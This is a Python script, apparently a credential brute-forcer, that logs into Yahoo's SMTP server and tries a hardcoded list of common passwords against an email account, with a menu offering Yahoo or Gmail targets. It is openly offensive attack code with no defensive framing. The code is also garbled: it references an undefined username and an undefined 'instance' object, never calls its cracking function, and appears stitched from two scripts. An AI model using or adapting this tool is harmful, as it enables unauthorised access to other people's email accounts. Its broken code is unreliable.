import smtplib, time, sys
 
try:
    server = smtplib.SMTP('smtp.mail.yahoo.com',587)
    server.ehlo()
    server.starttls()
except:
    print('[!] Error Connecting to SMTP Server')
    time.sleep(5)
    sys.exit()
 
passwords = ['password', 'admin', 'adminsitator', 'passwords', 'godlover', 'adminstatorlogin',
             'pass1337', 'location', 'muslim', 'password10', 'mylovelycat', 'justinBieber', 'crackingMe', 'catanddoglover',
             'ilovejesus', 'willgodeverbemyfriend', 'PaSssword', ]
amount = len(passwords)
 
def bruteForce():
    print('[*] Status: Cracking ('+str(amount)+') passwords')
    for password in passwords:
        time.sleep(1)
        try:
            server.login(username, password)
            combination = (username+':'+password)
            print('[*] Combination Found: %s' %combination)
            break
        except smtplib.SMTPAuthenticationError as msg:
            if msg.smtp_code == 534:
                print('[roy shammen] Password correct email verification is enabled (%s)' %password)
            elif msg.smtp_code == 535:
                print('[535] Incorrect password (%s)' %password)
    print('[*] Status: Finished!')
    time.sleep(5)
    sys.exit()
print('''

             _                 
            | |                
 _   _  __ _| |__   ___   ___  
| | | |/ _` | '_ \ / _ \ / _ \ 
| |_| | (_| | | | | (_) | (_) |
 \__, |\__,_|_| |_|\___/ \___/ 
  __/ |                        
 |___/                         

	''')


do = input('''
		Choose any number ?
		1 - yahoo
		2 - Meu Canal
		
		==> ''')

if do == '1':
    user = input("email : ")
    senha = input("passlist : ")
    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    instance.accounts.append(user)
    instance.get_pass_list(senha)

    instance.try_yahoo()
   
############
if do == '2':
    user = input("email : ")
    senha = input("passlist : ")
    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    instance.accounts.append(user)
    instance.get_pass_list(senha)

    instance.try_gmail()
